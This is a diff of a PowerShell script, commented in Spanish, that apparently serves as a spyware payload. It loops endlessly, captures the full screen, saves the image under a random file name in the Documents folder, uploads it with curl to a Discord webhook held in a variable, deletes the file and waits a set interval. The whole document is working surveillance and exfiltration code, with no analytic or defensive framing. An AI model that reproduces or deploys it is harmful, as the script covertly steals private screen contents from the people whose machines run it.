@@ -1,33 +1,32 @@
+# Definir la ruta de la carpeta de documentos
+$documentsFolder = [Environment]::GetFolderPath("MyDocuments")
+
+# Definir el nombre aleatorio del archivo
+$randomFileName = [System.IO.Path]::GetRandomFileName()
+
+# Definir la ruta completa del archivo de captura de pantalla
+$filePath = Join-Path -Path $documentsFolder -ChildPath "$randomFileName.png"
+
 # Definir la URL del webhook de Discord
 $webhookUrl = "$dc"
 
-# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
+# Bucle principal: tomar una captura de pantalla, enviarla al webhook y esperar
 While ($true) {
-    # Tomar la primera captura de pantalla
-    $firstScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-    $firstGraphic = [System.Drawing.Graphics]::FromImage($firstScreenshot)
-    $firstGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
+    # Tomar una captura de pantalla y guardarla en la carpeta de documentos con un nombre aleatorio
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
     
-    # Guardar la primera captura de pantalla en un archivo temporal
-    $firstFilePath = "$env:TEMP\SC1.png"
-    $firstScreenshot.Save($firstFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    # Enviar la captura de pantalla al webhook de Discord
+    curl.exe -F "file1=@$filePath" $webhookUrl
     
-    # Tomar la segunda captura de pantalla
-    $secondScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-    $secondGraphic = [System.Drawing.Graphics]::FromImage($secondScreenshot)
-    $secondGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
+    # Eliminar la captura de pantalla después de enviarla
+    Remove-Item -Path $filePath
     
-    # Guardar la segunda captura de pantalla en un archivo temporal
-    $secondFilePath = "$env:TEMP\SC2.png"
-    $secondScreenshot.Save($secondFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
-    
-    # Enviar ambas capturas de pantalla al webhook de Discord
-    curl.exe -F "file1=@$firstFilePath" -F "file2=@$secondFilePath" $webhookUrl
-    
-    # Eliminar los archivos temporales
-    Remove-Item -Path $firstFilePath
-    Remove-Item -Path $secondFilePath
-    
-    # Esperar 30 segundos antes de tomar la próxima captura
-    Start-Sleep -Seconds 30
+    # Esperar el intervalo de tiempo especificado antes de tomar la próxima captura de pantalla
+    Start-Sleep -Seconds $seconds
 }
